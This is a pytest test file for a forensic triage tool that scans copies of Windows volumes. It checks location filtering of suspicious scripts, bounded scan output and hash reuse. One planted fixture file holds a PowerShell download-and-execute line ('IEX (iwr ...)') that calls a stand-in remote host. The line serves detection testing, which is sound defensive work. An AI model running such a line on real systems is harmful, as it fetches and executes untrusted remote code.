"""Triage collections at the size of a real volume copy.

A copy of ``C:`` holds thousands of scripts, archives and databases that
ship with Windows and installed programs. The first real run catalogued
all of them, so the scan_evidence response outgrew what the cataloging
agent could read and it fell back to walking directories one call at a
time. These tests pin the location filter, the bounded response, and the
hash reuse that keeps the scan fast.
"""

from __future__ import annotations

import hashlib
import json
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch

import pytest
from click.testing import CliRunner

from mulder.extractors.classifier import EvidenceClassifier
from mulder.triage import in_writable_location
from mulder.triage.prepare import MANIFEST_NAME, prepare_triage

_PLANTED = {
    "Users/eli/Downloads/SysinternalsSuite.zip": b"PK\x03\x04zip",
    "Users/eli/Downloads/invoke.ps1": b"IEX (iwr http://198.51.100.7/a)",
    "Windows/Temp/drop.bat": b"@echo off",
    "ProgramData/updater/run.vbs": b"CreateObject",
    "Users/eli/AppData/Roaming/Mozilla/Firefox/Profiles/a.default/places.sqlite": (
        b"SQLite format 3\x00"
    ),
    "stage.ps1": b"root-level drop",
}


def _volume(root: Path, noise: int = 600) -> Path:
    """A Windows volume root with *noise* benign files in each program tree."""
    files: dict[str, bytes] = {
        "$MFT": b"FILE0",
        "Windows/System32/config/SYSTEM": b"regf",
        "Windows/System32/winevt/Logs/Security.evtx": b"ElfFile",
        "Windows/Minidump/092526-1234-01.dmp": b"PAGEDU64",
        "Program Files/Vendor/bundle.zip": b"PK",
        "Users/eli/AppData/Local/Microsoft/Windows/Explorer/thumbcache_32.db": b"CMMM",
        **_PLANTED,
    }
    for i in range(noise):
        files[f"Windows/System32/WindowsPowerShell/v1.0/Modules/M{i}/M{i}.psm1"] = b"#"
        files[f"Program Files/App{i % 7}/resources/f{i}.js"] = b"//"
        files[f"Users/eli/AppData/Local/Programs/Code/resources/app/f{i}.js"] = b"//"
        files[f"Users/eli/src/proj/node_modules/pkg{i}/index.js"] = b"//"
        files[f"ProgramData/Microsoft/Windows Defender/Scans/s{i}.ps1"] = b"#"
        files[f"Users/eli/AppData/Local/Google/Chrome/User Data/Default/Extensions/e/{i}.js"] = (
            b"//"
        )
    for rel, data in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
    return root


@pytest.fixture()
def volume(tmp_path: Path) -> Path:
    return _volume(tmp_path / "evidence" / "C")


class TestLocationFilter:
    @pytest.mark.parametrize(
        ("rel", "expected"),
        [
            ("stage.ps1", True),
            ("Users/eli/Downloads/x.ps1", True),
            ("Users/eli/Downloads/extensions/x.ps1", True),
            ("Windows/Temp/x.bat", True),
            ("ProgramData/evil/x.vbs", True),
            ("$Recycle.Bin/S-1-5-21-1/$R1.ps1", True),
            ("PerfLogs/x.bat", True),
            ("Windows/System32/x.ps1", False),
            ("Program Files/App/x.js", False),
            ("Program Files (x86)/App/x.js", False),
            ("Users/eli/AppData/Local/Programs/App/x.js", False),
            ("Users/eli/proj/node_modules/p/x.js", False),
            ("Users/eli/AppData/Roaming/Mozilla/Firefox/Profiles/p/extensions/x.xpi", False),
            ("ProgramData/Microsoft/Windows Defender/x.ps1", False),
        ],
    )
    def test_rules(self, rel: str, expected: bool) -> None:
        assert in_writable_location(rel) is expected


class TestCatalogOfAFullVolume:
    def test_only_planted_items_are_listed(self, volume: Path) -> None:
        by_type: dict[str, set[str]] = {}
        for item in EvidenceClassifier().classify(volume.parent):
            rel = item.path.relative_to(volume).as_posix() if item.path != volume else "."
            by_type.setdefault(item.artifact_type, set()).add(rel)

        assert by_type.pop("triage_collection") == {"."}
        assert by_type == {
            "script": {
                "Users/eli/Downloads/invoke.ps1",
                "Windows/Temp/drop.bat",
                "ProgramData/updater/run.vbs",
                "stage.ps1",
            },
            "compressed_archive": {"Users/eli/Downloads/SysinternalsSuite.zip"},
            "sqlite_database": {
                "Users/eli/AppData/Roaming/Mozilla/Firefox/Profiles/a.default/places.sqlite"
            },
        }

    def test_scan_response_stays_small(self, volume: Path, tmp_path: Path) -> None:
        from mulder.server.app import _tool_dispatch_sync, init_server

        init_server(db_dir=tmp_path / "cases")
        result = _tool_dispatch_sync["scan_evidence"](
            evidence_path=str(volume.parent), case_id="scale"
        )
        assert result["status"] == "success"
        assert len(json.dumps(result)) < 8_000
        (collection,) = result["triage_collections"]
        assert collection["path"] == str(volume)
        assert "USN journal ($J)" in collection["missing_artifacts"]


class TestEvidenceTree:
    def test_each_type_is_capped_with_a_count(self, tmp_path: Path) -> None:
        from mulder.server.tools.case import _TREE_PER_TYPE, _render_evidence_tree

        manifest: list[dict[str, object]] = [
            {"path": str(tmp_path / f"s{i}.ps1"), "artifact_type": "script"} for i in range(1000)
        ]
        manifest.append({"path": str(tmp_path / "mem.raw"), "artifact_type": "memory_dump"})
        lines = _render_evidence_tree(tmp_path, manifest)

        listed = [line for line in lines if not line.startswith("...")]
        assert sum("[script]" in line for line in listed) == _TREE_PER_TYPE
        assert any("mem.raw  [memory_dump]" in line for line in lines)
        assert lines[-1].startswith(f"... {1000 - _TREE_PER_TYPE} more [script] item(s)")

    def test_small_manifests_are_listed_in_full(self, tmp_path: Path) -> None:
        from mulder.server.tools.case import _render_evidence_tree

        manifest: list[dict[str, object]] = [
            {"path": str(tmp_path / "a.evtx"), "artifact_type": "evtx"},
            {"path": str(tmp_path / "b.pcap"), "artifact_type": "network_capture"},
        ]
        lines = _render_evidence_tree(tmp_path, manifest)
        assert len(lines) == 3
        assert not any(line.startswith("...") for line in lines)


class TestHashing:
    def _register(self, manifest: list[dict[str, object]]) -> tuple[list[str], MagicMock]:
        from mulder.server.tools.case import _hash_and_register_evidence

        ctx = MagicMock()
        with (
            patch("mulder.server.app.has_ctx", return_value=True),
            patch("mulder.server.app.get_ctx", return_value=ctx),
        ):
            failed = _hash_and_register_evidence(manifest)
        return failed, ctx.db.register_evidence_files

    def test_manifest_hashes_are_reused(self, tmp_path: Path) -> None:
        src = _volume(tmp_path / "src" / "C", noise=3)
        prepare_triage(src, tmp_path / "triage", hostname="ws", kind="tree")
        root = tmp_path / "triage" / "ws" / "C"
        manifest = json.loads((root.parent / MANIFEST_NAME).read_text())
        recorded = {r["path"]: r["sha256"] for r in manifest["files"]}

        # Same size, different bytes: only a reused hash can still match the manifest.
        (root / "stage.ps1").write_bytes(b"ROOT-LEVEL DROP")
        # Different size: must be hashed again.
        (root / "Windows" / "Temp" / "drop.bat").write_bytes(b"@echo off & del")

        failed, register = self._register(
            [{"path": str(root), "artifact_type": "triage_collection"}]
        )
        rows = {path: sha for call in register.call_args_list for path, sha, _ in call.args[0]}

        assert failed == []
        assert len(rows) == len(recorded)
        assert rows[str(root / "stage.ps1")] == recorded["C/stage.ps1"]
        new_bat = hashlib.sha256(b"@echo off & del").hexdigest()
        assert rows[str(root / "Windows" / "Temp" / "drop.bat")] == new_bat

    def test_rows_are_written_in_batches(self, volume: Path) -> None:
        from mulder.server.tools.case import _REGISTER_BATCH

        _failed, register = self._register(
            [{"path": str(volume), "artifact_type": "triage_collection"}]
        )
        sizes = [len(call.args[0]) for call in register.call_args_list]
        total = sum(1 for p in volume.rglob("*") if p.is_file())
        assert sum(sizes) == total
        assert max(sizes) <= _REGISTER_BATCH
        assert len(sizes) == -(-total // _REGISTER_BATCH) + (total % _REGISTER_BATCH == 0)

    def test_database_batch_insert(self, tmp_case_db: Any) -> None:
        tmp_case_db.register_evidence_files([("/e/a", "aa", 1), ("/e/b", "bb", 2)])
        tmp_case_db.register_evidence_files([])
        rows = tmp_case_db.get_evidence_registry()
        assert [(r["file_path"], r["sha256"], r["size_bytes"]) for r in rows] == [
            ("/e/a", "aa", 1),
            ("/e/b", "bb", 2),
        ]


def test_prepare_triage_reports_progress(tmp_path: Path) -> None:
    from mulder.cli import cli

    src = _volume(tmp_path / "C", noise=2)
    res = CliRunner().invoke(
        cli, ["prepare-triage", str(src), str(tmp_path / "out"), "--hostname", "ws"]
    )
    assert res.exit_code == 0, res.output
    assert "Reading" in res.output
    assert "copying and hashing" in res.output
    assert "(100%)" in res.output
